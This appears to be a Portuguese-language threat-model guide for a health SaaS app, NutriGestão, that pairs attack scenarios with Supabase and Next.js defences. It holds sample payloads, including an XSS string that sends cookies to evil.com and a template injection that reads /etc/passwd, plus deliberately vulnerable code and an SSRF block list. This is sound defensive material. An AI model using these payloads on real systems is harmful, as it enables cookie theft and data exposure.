# Vetores de Ataque Específicos — NutriGestão

## 1. Cross-Tenant Data Leak via IDOR

### Cenário de Ataque
```
1. Nutricionista Maria (tenant "aaa") lista seus pacientes
2. Maria inspeciona a resposta HTTP e vê IDs de pacientes
3. Maria altera a URL para /app/pacientes/[ID-de-paciente-de-outro-tenant]
4. Se RLS estiver quebrado, Maria vê dados do paciente de João (tenant "bbb")
```

### Como Testar (Mental Model)
Para CADA endpoint que recebe ID como parâmetro:
1. O RLS está ativo na tabela? (`ENABLE ROW LEVEL SECURITY`)
2. A policy de SELECT usa `auth.uid() = user_id`?
3. O código faz `notFound()` se retorno for null?

### Variante: Cascata de JOIN
```sql
-- Se visits tem RLS mas visit_photos NÃO tem RLS:
SELECT vp.* FROM visit_photos vp
JOIN visits v ON v.id = vp.visit_id
-- RLS de visits filtra, mas se visit_photos for acessada diretamente:
SELECT * FROM visit_photos WHERE visit_id = 'id-conhecido'
-- SEM RLS em visit_photos = LEAK
```

**Regra: TODA tabela com dados de tenant precisa de RLS próprio, não depender só de JOINs.**

---

## 2. Service Role Key Exposure

### Cenário de Ataque
```
1. Atacante inspeciona bundle JavaScript do frontend
2. Encontra SUPABASE_SERVICE_ROLE_KEY (que bypass RLS)
3. Usa a key para fazer queries diretas ao Supabase REST API
4. Acessa TODOS os dados de TODOS os tenants
```

### Como Detectar
```bash
# Buscar em código client-side
grep -rn "SUPABASE_SERVICE_ROLE" --include="*.ts" --include="*.tsx" \
  app/ components/ lib/ | grep -v "server\.ts" | grep -v "middleware"

# Buscar em variáveis sem NEXT_PUBLIC (OK no server)
# vs variáveis COM NEXT_PUBLIC (expostas ao browser)
grep -rn "NEXT_PUBLIC.*SERVICE_ROLE" . 2>/dev/null
# ^^ ZERO resultados = OK; qualquer resultado = CRÍTICO

# Verificar no bundle gerado
grep -r "service_role" .next/ 2>/dev/null
```

### Regra Absoluta
- `SUPABASE_SERVICE_ROLE_KEY` NUNCA em variáveis `NEXT_PUBLIC_*`
- `SUPABASE_SERVICE_ROLE_KEY` NUNCA em Client Components
- `SUPABASE_SERVICE_ROLE_KEY` APENAS em: workers/, Edge Functions com secret, scripts de migração

---

## 3. SQL Injection via Supabase

### PostgREST é Seguro por Design, MAS...

O client Supabase usa queries parametrizadas. Porém, vetores existem:

```typescript
// ❌ VULNERÁVEL — SQL dinâmico via .rpc() com concatenação
const { data } = await supabase.rpc('search_patients', {
  search_query: `%${userInput}%` // Se search_query for usado em SQL raw...
})

// Dentro da function no PostgreSQL:
// CREATE FUNCTION search_patients(search_query TEXT) AS $$
//   EXECUTE 'SELECT * FROM patients WHERE name LIKE ' || search_query
//   -- ^^ SQL INJECTION!
// $$ LANGUAGE plpgsql;
```

```sql
-- ✅ SEGURO — usar parâmetros
CREATE FUNCTION search_patients(search_query TEXT)
RETURNS SETOF patients AS $$
  SELECT * FROM patients WHERE name ILIKE '%' || search_query || '%'
$$ LANGUAGE sql SECURITY INVOKER; -- INVOKER = respeita RLS do caller
```

### Verificação Obrigatória
- [ ] Toda function PostgreSQL usa `SECURITY INVOKER` (respeita RLS) a menos que explicitamente justificado
- [ ] Nenhuma function usa `EXECUTE` com concatenação de input
- [ ] Nenhuma function usa `SECURITY DEFINER` sem necessidade (bypass RLS)

---

## 4. XSS (Cross-Site Scripting)

### Cenários no NutriGestão

```typescript
// ❌ VULNERÁVEL — anotação de visita com HTML malicioso
const annotation = '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">'
// Se renderizado com dangerouslySetInnerHTML:
<div dangerouslySetInnerHTML={{ __html: annotation }} />
// Cookie roubado!

// ❌ VULNERÁVEL — nome de paciente com script
const patientName = '<script>alert("xss")</script>'
// React escapa por padrão, MAS:
<div dangerouslySetInnerHTML={{ __html: patientName }} /> // NÃO escapa
```

### Defesas

```typescript
// 1. React escapa JSX por padrão — usar JSX, não innerHTML
<p>{annotation}</p> // ✅ SEGURO — React escapa HTML

// 2. Se PRECISAR renderizar HTML (rich text), sanitizar:
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'li'],
  ALLOWED_ATTR: [] // nenhum atributo permitido
})
<div dangerouslySetInnerHTML={{ __html: clean }} />

// 3. CSP com nonce como última camada de defesa
```

---

## 5. SSRF (Server-Side Request Forgery)

### Cenário no NutriGestão

```typescript
// Se implementar importação de URL de imagem:
// ❌ VULNERÁVEL
const imageUrl = formData.get('image_url') as string
const response = await fetch(imageUrl) // pode ser http://169.254.169.254/metadata

// ✅ SEGURO — validar URL
function isAllowedUrl(url: string): boolean {
  try {
    const parsed = new URL(url)
    // Só HTTPS
    if (parsed.protocol !== 'https:') return false
    // Bloquear IPs internos
    const forbidden = ['127.0.0.1', 'localhost', '169.254.', '10.', '172.16.', '192.168.']
    if (forbidden.some(ip => parsed.hostname.includes(ip))) return false
    // Bloquear metadata endpoints
    if (parsed.hostname === 'metadata.google.internal') return false
    return true
  } catch {
    return false
  }
}
```

---

## 6. Template Injection (PDF/Email)

### Cenário

```typescript
// ❌ VULNERÁVEL — dados do usuário em template de PDF
const html = `<h1>Relatório para ${patientName}</h1>`
// Se patientName = '${require("child_process").execSync("cat /etc/passwd")}'
// Em alguns motores de template, isso executa código

// ✅ SEGURO — escape manual ou template engine com sandbox
import { escapeHtml } from './utils'
const html = `<h1>Relatório para ${escapeHtml(patientName)}</h1>`
```

### Verificação
- [ ] Nunca usar `eval()` ou `new Function()` com input do usuário
- [ ] Templates de PDF usam apenas variáveis escapadas
- [ ] Templates de email usam apenas variáveis escapadas
- [ ] Worker de PDF roda em container isolado (não no processo principal)

---

## 7. Open Redirect

### Cenário

```typescript
// ❌ VULNERÁVEL
const returnUrl = searchParams.get('returnUrl')
redirect(returnUrl!) // pode ser https://evil.com/phishing

// ✅ SEGURO — validar que é URL interna
function safeRedirect(url: string | null, fallback: string): string {
  if (!url) return fallback
  try {
    const parsed = new URL(url, 'http://localhost')
    // Só aceitar paths relativos (sem host externo)
    if (parsed.origin !== 'http://localhost') return fallback
    return parsed.pathname + parsed.search
  } catch {
    return fallback
  }
}

redirect(safeRedirect(searchParams.get('returnUrl'), '/app/dashboard'))
```

---

## 8. Broken Object Level Authorization (BOLA)

### Cenário Supabase Storage

```
1. Nutricionista faz upload de foto de visita
2. Foto fica em: storage/visits/{visit_id}/photo.jpg
3. Se o bucket for público ou policy não verifica user_id:
4. Qualquer pessoa com a URL pode ver a foto (dados de saúde!)
```

### Storage Policy Correta

```sql
-- Bucket: visits-photos (PRIVADO)
-- Policy: só o dono pode ler/escrever

CREATE POLICY "Tenant can upload own visit photos"
ON storage.objects
FOR INSERT
WITH CHECK (
  bucket_id = 'visits-photos'
  AND (storage.foldername(name))[1] = auth.uid()::text
);

CREATE POLICY "Tenant can view own visit photos"
ON storage.objects
FOR SELECT
USING (
  bucket_id = 'visits-photos'
  AND (storage.foldername(name))[1] = auth.uid()::text
);

-- Upload path DEVE ser: {user_id}/{visit_id}/{filename}
```

---

## 9. Denial of Service (Application Layer)

### Vetores no NutriGestão

| Vetor | Como | Defesa |
|-------|------|--------|
| Login brute force | Milhares de tentativas/segundo | Rate limit 5/min/IP + CAPTCHA após 3 falhas |
| Signup spam | Criar milhares de contas | Rate limit + email confirmation obrigatório |
| Upload flood | Upload de arquivos enormes | Limit size (10MB), rate limit upload (10/min) |
| Query pesada | Listar todos os pacientes com joins | Paginação obrigatória, limit default 50 |
| PDF generation | Solicitar centenas de PDFs | Fila com prioridade, limit por tenant |
| CSV import | Upload de CSV com 1M linhas | Limit 500 registros (NFR7), validar antes de processar |
| Cascata de custos | Alterar preço que afeta 10K fichas | Processar em background, limit de fichas afetadas |
| Realtime abuse | Milhares de subscriptions | Throttle no client, unsubscribe ao desmontar |

### Paginação Obrigatória

```typescript
// ❌ VULNERÁVEL — sem limite
const { data } = await supabase.from('patients').select('*')

// ✅ SEGURO — sempre com paginação
const PAGE_SIZE = 50
const { data, count } = await supabase
  .from('patients')
  .select('*', { count: 'exact' })
  .range(page * PAGE_SIZE, (page + 1) * PAGE_SIZE - 1)
  .order('created_at', { ascending: false })
```

---

## 10. CVE-2025-29927 — Next.js Middleware Bypass

### O que aconteceu
Em versões Next.js < 15.2.3, um atacante podia enviar o header `x-middleware-subrequest` para fazer o middleware **ignorar completamente a requisição**. Isso significa que toda proteção de auth no middleware era bypassada.

### Verificação

```bash
# Verificar versão do Next.js
cat node_modules/next/package.json | grep '"version"'
# Deve ser >= 15.2.3
```

### Defesa adicional (defense-in-depth)
Mesmo com middleware corrigido, **nunca depender só do middleware para auth:**

```typescript
// Server Component: SEMPRE verificar auth
export default async function ProtectedPage() {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) redirect('/auth/login')
  // ... usar user
}

// Server Action: SEMPRE verificar auth
export async function sensitiveAction() {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) throw new Error('Não autenticado')
  // ... lógica
}
```

A auth no middleware é conveniência (redirect rápido). A auth **real** é no Server Component/Action + RLS no banco.
